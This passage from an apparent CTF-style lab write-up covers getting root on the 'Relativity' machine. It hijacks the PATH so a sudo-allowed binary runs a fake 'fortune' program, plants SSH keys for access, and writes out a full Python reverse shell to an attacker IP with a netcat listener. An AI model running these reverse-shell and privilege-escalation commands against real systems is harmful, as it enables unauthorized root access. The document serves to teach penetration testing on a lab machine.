-<p>``` plain
-python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/sh&rdquo;)&rsquo;
-sh-4.2$ sudo -l
-sudo -l
-Matching Defaults entries for jetta on this host:</p>
-
-<pre><code>requiretty, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
-LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
-LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
-LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
-LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
-XAUTHORITY PATH", env_reset
-</code></pre>
-
-<p>User jetta may run the following commands on this host:</p>
-
-<pre><code>(root) NOPASSWD: /home/jetta/auth_server/auth_server
-</code></pre>
-
-<p>```</p>
-
-<p>Excellent, so the key to getting root is in exploiting that binary we found earlier. I ran it to see what it does:</p>
-
-<p>``` plain
-sh-4.2$ /home/jetta/auth_server/auth_server
-/home/jetta/auth_server/auth_server
-[+] Checking Certificates&hellip;done
-[+] Contacting server, please wait&hellip;could not establish connection
-error: (12)</p>
-
-<hr />
-
-<p>&lt; There isn&rsquo;t any problem ></p>
-
-<hr />
-
-<pre><code>    \   ^__^
-     \  (oo)\_______
-        (__)\       )\/\
-            ||----w |
-            ||     ||
-</code></pre>
-
-<p>```</p>
-
-<p>I ran it several times for fun, made a mental note to replace my fortune cookies at the end of the blog posts with cowsay fortune cookies because this is purely awesome, then looked at <em>strings</em> again. Looking at the line <code>fortune -s | /usr/bin/cowsay</code>, we see that the <em>fortune</em> command doesn&rsquo;t use an absolute path. So we can create a program of our choosing called fortune and modify our PATH variable to start looking in the location of our program. At this point I tried several ways to get a local or reverse root shell but I kept getting errors that the fortune file is busy, so instead of running the exploit every time and then getting a TTY shell on top of it, I thought maybe I can log in directly as jetta now and work from there. So I made a <code>.ssh</code> directory inside jetta&rsquo;s home folder and copied there mauk&rsquo;s <code>authorized_keys</code> file (remember the permissions were too lax). So now I could directly ssh as jetta and try again for the shell.</p>
-
-<p>This time I used a <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Python reverse shell</a>:</p>
-
-<p><code>plain
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.80.130",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-</code>
-I updated it with my host address and port, put it in a file named fortune, gave it permissions and updated  the  path to start looking in <em>/tmp/</em>:</p>
-
-<p>``` plain</p>
-
-<p>[jetta@Relativity ~]$ chmod 777 /tmp/fortune</p>
-
-<p>[jetta@Relativity ~]$ export PATH=&ldquo;/tmp:$PATH&rdquo;</p>
-
-<p>[jetta@Relativity ~]$ echo $PATH
-/tmp:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/jetta/.local/bin:/home/jetta/bin
-```</p>
-
-<p>On my machine I had netcat listen for connections:</p>
-
-<p><code>plain
-root@kali:~# nc -vnlp 5555
-nc: listening on :: 5555 ...
-nc: listening on 0.0.0.0 5555 ...
-</code></p>
-
-<p>And now I ran <code>auth_server</code> again:</p>
-
-<p><code>plain
-[jetta@Relativity ~]$ sudo /home/jetta/auth_server/auth_server
-[+] Checking Certificates...done
-[+] Contacting server, please wait...could not establish connection
-error: (12)
-</code></p>
-
-<p>And on my netcat side:</p>
-
-<p><code>plain
-sh-4.2# whoami
-whoami
-root
-sh-4.2# cat /root/flag.txt
-cat /root/flag.txt
-65afa0e5928b98f7ae283e16df2d43bf
-</code></p>
-
-<p>Was curious about the hash, ran it in an online decrypter, the result was <em>sagishahar</em>.</p>
-
-<p>Markdown formatting was a pain in the ass for cowsay, so a slightly different fortune cookie format, but straight from the cow&rsquo;s mouth!</p>
-
-<p><img class="center" src="/images/pentest/relativity/cookie.png" title="&lsquo;cookie&rsquo; &lsquo;fortune cowsay&rsquo;" ></p>
 ]]></content>
   </entry>
   
